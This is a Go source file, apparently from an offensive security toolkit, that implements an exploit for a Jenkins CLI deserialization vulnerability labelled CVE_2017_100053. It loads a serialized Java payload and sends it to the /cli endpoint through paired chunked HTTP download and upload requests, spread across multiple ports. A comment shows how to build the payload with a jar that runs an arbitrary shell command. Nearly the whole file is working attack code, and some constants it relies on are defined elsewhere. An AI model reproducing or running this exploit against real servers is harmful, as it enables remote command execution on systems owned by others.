package jenkins

import (
	"bytes"
	"fmt"
	"github.com/google/uuid"
	"io/ioutil"
	"net/http"
	"os"
	"sync"
	"time"
)

func createPayload() {

}
func null_payload() []byte {
	return []byte(" ")
}
func download(url, uid string, timeOut time.Duration) {
	http_cli := &http.Client{
		Timeout: timeOut,
	}

	request, _ := http.NewRequest("POST", url, bytes.NewBuffer(null_payload()))
	headers := &http.Header{}
	headers.Add("Session", uid)
	headers.Add("Side", "download")
	headers.Add("Content-type", "application/x-www-form-urlencoded")
	headers.Add("Transfer-Encoding", "chunked")
	request.Header = *headers
	fmt.Println(request.Header)
	response, err := http_cli.Do(request)
	if err != nil {
		fmt.Println(err)
		return
	} else {
		out, err := ioutil.ReadAll(response.Body)
		fmt.Println("download", response.StatusCode, string(out), err)
	}
}

func upload_chunked(url, uid string, timeOut time.Duration) {
	http_cli := &http.Client{
		Timeout: timeOut,
	}
	request, _ := http.NewRequest("POST", url, bytes.NewReader(payloadData))
	headers := &http.Header{}
	headers.Add("Session", uid)
	headers.Add("Side", "upload")
	headers.Add("Content-type", "application/octet-stream")
	headers.Add("Transfer-Encoding", "chunked")
	headers.Add("Cache-Control", "no-cache")
	headers.Add("Accept-Encoding", "")
	request.Header = *headers
	response, err := http_cli.Do(request)
	if err != nil {
		fmt.Println(err)
		return
	} else {
		out, err := ioutil.ReadAll(response.Body)
		fmt.Println("upload", response.StatusCode, string(out), err)
	}
}

/*
java -jar CVE_2017_100053-1.1-SNAPSHOT-all.jar PAYLOAD_NAME CMD
usage:java -jar CVE_2017_100053-1.1-SNAPSHOT-all.jar JiuAn.ser "touch /tmp/JiuAn_test"
*/
var payloadData []byte

/*
尚未找到合适的环境
*/
func JenkinsCVE_2017_100053(ip string, ports []string, timeOut time.Duration, payload string) ([]string, bool) {
	file, err := os.Open(payload)
	if err != nil {
		return nil, false
	}

	data, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, false
	}

	payloadData = append(make([]byte, 0), PREAMLE...)
	payloadData = append(payloadData, PROTO...)
	payloadData = append(payloadData, data...)

	if len(ports) == 0 {
		ports = default_ports
	}
	var wg sync.WaitGroup
	for _, port := range ports {
		wg.Add(1)
		addr := fmt.Sprintf("http://%s:%s/cli", ip, port)
		fmt.Println(addr)
		go func() {
			defer wg.Done()
			uid, err := uuid.NewUUID()
			if err != nil {
				return
			}
			go download(addr, uid.String(), timeOut)
			fmt.Println("exec url:", addr)
			time.Sleep(time.Second * 2)

			upload_chunked(addr, uid.String(), timeOut)
		}()
	}
	wg.Wait()
	return nil, false
}
